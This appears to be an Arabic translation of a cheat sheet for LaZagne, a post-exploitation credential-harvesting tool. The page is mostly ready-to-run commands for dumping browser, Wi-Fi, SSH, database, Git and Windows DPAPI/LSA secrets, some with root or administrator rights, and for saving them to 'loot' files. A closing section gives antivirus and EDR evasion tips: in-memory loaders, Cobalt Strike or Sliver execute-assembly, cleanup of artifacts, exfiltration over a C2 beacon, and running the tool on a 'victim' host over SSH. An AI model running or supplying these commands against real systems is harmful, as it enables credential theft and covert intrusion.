<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ورقة الغش لازاني

[LaZagne](https://github.com/AlessandroZ/LaZagne) هو تطبيق مفتوح المصدر لمرحلة ما بعد الاستغلال يستخدم لاسترداد كلمات المرور المخزنة على جهاز كمبيوتر محلي. وهو يدعم أنظمة التشغيل Windows وLinux وmacOS عبر فئات متعددة بما في ذلك متصفحات الويب وعملاء البريد الإلكتروني وشبكات Wi-Fi وبرامج إدارة قواعد البيانات وأدوات مسؤول النظام وذاكرات التخزين المؤقت للذاكرة.

---

## جدول المحتويات

- [الوحدات والفئات المدعومة](#الوحدات المدعومة--الفئات)
- [التثبيت والثنائيات](#installation--binaries)
- [حصاد بيانات اعتماد Linux](#حصاد بيانات اعتماد Linux)
- [حصاد بيانات اعتماد Windows](#windows-credential-harvesting)
- [هجمات الفئات المستهدفة](#targeted-category-attacks)
- [تنسيقات الإخراج وتصدير الملفات](#output-formats--file-export)
- [الأمن التشغيلي وتجنب EDR](#الأمن التشغيلي--تجنب-edr)

---

## الوحدات والفئات المدعومة

يستخرج LaZagne بيانات الاعتماد من عشرات التطبيقات المجمعة في فئات:
- **المتصفحات:** Chrome وFirefox وEdge وOpera وBrave وChromium (السجل والتعبئة التلقائية وملفات تعريف الارتباط وبيانات الاعتماد).
- **أدوات مسؤول النظام:** WinSCP، PuTTY، OpenSSH (مفاتيح / تكوين `id_rsa`)، RDP / mstsc، FileZilla، Cyberduck، VNC.
- **قواعد البيانات:** DBeaver، pgAdmin، Squirrel، Robomongo، SQL Server Management Studio.
- **Wi-Fi:** مفاتيح WPA2/WPA3 المشتركة مسبقًا (PSK) المخزنة في ملفات تعريف شبكة نظام التشغيل.
- **المطور وVCS:** بيانات اعتماد Git (`.git-credentials`، ذاكرة التخزين المؤقت)، SVN، رموز Docker، بيانات اعتماد AWS CLI.
- **البريد الإلكتروني والدردشة:** Thunderbird، Outlook، Pidgin، Skype.
- **Windows Vault & DPAPI:** أسرار LSA، ومفاتيح DPAPI الرئيسية، وعناصر قبو مدير الاعتماد.

---

## التثبيت والثنائيات
```bash
# Clone the repository
git clone https://github.com/AlessandroZ/LaZagne.git
cd LaZagne

# Install Python dependencies (for running source on Linux)
pip install -r requirements.txt

# Or download pre-compiled standalone binaries (releases page)
# Windows: lazagne.exe
# Linux: laZagne.py
```
---

## حصاد بيانات اعتماد Linux

### 1. تشغيل كافة وحدات الاستخراج
```bash
python3 laZagne.py all
```
### 2. التشغيل باستخدام امتيازات الجذر / Sudo (يوسع الوصول إلى الظل وحلقة المفاتيح)
يؤدي تشغيل `root` إلى فتح أسرار النظام وملفات تعريف Wi-Fi في `/etc/NetworkManager` ومفاتيح SSH عبر جميع أدلة `/home/*`:
```bash
sudo python3 laZagne.py all
```
### 3. استخراج كلمات المرور من Gnome Keyring / KWallet
```bash
python3 laZagne.py sysadmin -k
```
---

## حصاد بيانات اعتماد Windows

على نظام التشغيل Windows، استخدم الملف القابل للتنفيذ المستقل `lazagne.exe`:

### 1. استخراج كافة كلمات المرور المخزنة
```cmd
lazagne.exe all
```
### 2. التشغيل بامتيازات مرتفعة (المسؤول / النظام)
قم باستخراج مفاتيح DPAPI الرئيسية وأسرار LSA وبيانات اعتماد المجال المخزنة مؤقتًا:
```cmd
lazagne.exe all -v
```
### 3. استخراج كلمات المرور لمستخدم معين (عند التشغيل كمسؤول)
```cmd
lazagne.exe all -path "C:\Users\TargetUser\AppData"
```
---

## هجمات الفئات المستهدفة

بدلاً من تشغيل جميع الوحدات، حدد فئات البرامج المستهدفة لتقليل نشاط القرص والضوضاء:

### 1. متصفحات الويب فقط
```bash
# Linux
python3 laZagne.py browsers

# Windows
lazagne.exe browsers
```
### 2. كلمات مرور نصية واضحة لشبكة Wi-Fi
```bash
# Linux (requires root or sudo)
sudo python3 laZagne.py wifi

# Windows
lazagne.exe wifi
```
### 3. أدوات مسؤول النظام والوصول عن بعد (SSH، RDP، WinSCP، FileZilla)
```bash
# Linux
python3 laZagne.py sysadmin

# Windows
lazagne.exe sysadmin
```
### 4. عملاء قاعدة البيانات
```bash
# Linux
python3 laZagne.py databases

# Windows
lazagne.exe databases
```
### 5. بيانات اعتماد المطور وGit
```bash
# Linux
python3 laZagne.py git
```
---

## تنسيقات الإخراج وتصدير الملفات

احفظ بيانات الاعتماد المجمعة مباشرةً على القرص بتنسيقات منظمة:

### تصدير إلى تنسيق JSON
```bash
python3 laZagne.py all -oJ -oN /tmp/loot_credentials
```
ينشئ `/tmp/loot_credentials.json` يحتوي على بيانات اعتماد منظمة وعناوين URL وأسماء مستخدمين وكلمات مرور نصية عادية.

### تصدير إلى نص عادي
```bash
python3 laZagne.py all -oT -oN /tmp/loot_credentials
```
إنشاء `/tmp/loot_credentials.txt`.

---

## الأمن التشغيلي وتجنب EDR

- **اكتشاف برامج مكافحة الفيروسات:** تم توقيع `lazagne.exe` المستقل بشكل كبير بواسطة Windows Defender وحلول EDR التجارية.
- **التشويش والتنفيذ داخل الذاكرة:**
  - التنفيذ عبر انعكاس PowerShell أو أدوات التحميل في الذاكرة (`donut`، `execute-assembly` في Cobalt Strike / Sliver).
  - استخدم إصدار Python المصدري مع بيئة افتراضية مخصصة بدلاً من الإصدار الثنائي PyInstaller المعبأ.
- **تنظيف العناصر:** حذف الملفات المؤقتة المسروقة أو إعادة توجيه المخرجات مباشرةً من خلال مخرج قياسي عبر إشارة C2 مشفرة أو جلسة SSH:
  ```bash
  ssh victim@192.168.1.50 'python3 -' < laZagne.py all
  ```